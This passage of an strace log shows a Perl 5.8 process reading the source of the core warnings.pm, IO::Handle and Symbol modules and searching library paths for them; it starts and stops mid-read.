\"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
10890 07:35:08.640333 brk(0x81b6000)    = 0x81b6000
10890 07:35:08.640350 brk(0x81b5000)    = 0x81b5000
10890 07:35:08.640430 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
10890 07:35:08.640901 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
10890 07:35:08.644879 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
10890 07:35:08.645143 read(8, "", 4096) = 0
10890 07:35:08.645159 close(8)          = 0
10890 07:35:08.645323 _llseek(5, 412, [412], SEEK_SET) = 0
10890 07:35:08.645339 _llseek(5, 0, [412], SEEK_CUR) = 0
10890 07:35:08.645350 close(5)          = 0
10890 07:35:08.645394 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10890 07:35:08.645419 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10890 07:35:08.645495 futex(0xb7fcb070, 0x81 /* FUTEX_??? */, 2147483647) = 0
10890 07:35:08.645513 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 5
10890 07:35:08.645528 read(5, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10890 07:35:08.645617 fstat64(5, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10890 07:35:08.645643 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0xb7fcf000
10890 07:35:08.645657 mmap2(0xb7fd3000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 5, 0x3) = 0xb7fd3000
10890 07:35:08.645672 close(5)          = 0
10890 07:35:08.645804 stat64("/etc/perl/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645821 stat64("/etc/perl/IO/Handle.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645835 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645848 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645863 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645876 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645890 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645902 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645916 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645952 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645980 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.645994 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
10890 07:35:08.646015 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.646030 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.646042 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.646059 read(5, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
10890 07:35:08.646411 stat64("/etc/perl/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646456 stat64("/etc/perl/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646471 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646484 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646499 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646516 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646544 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646556 stat64("/usr/lib/perl5/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646570 stat64("/usr/share/perl5/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646582 stat64("/usr/share/perl5/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646595 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646607 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646621 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.646634 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
10890 07:35:08.646655 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.646670 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.646681 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.646699 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, 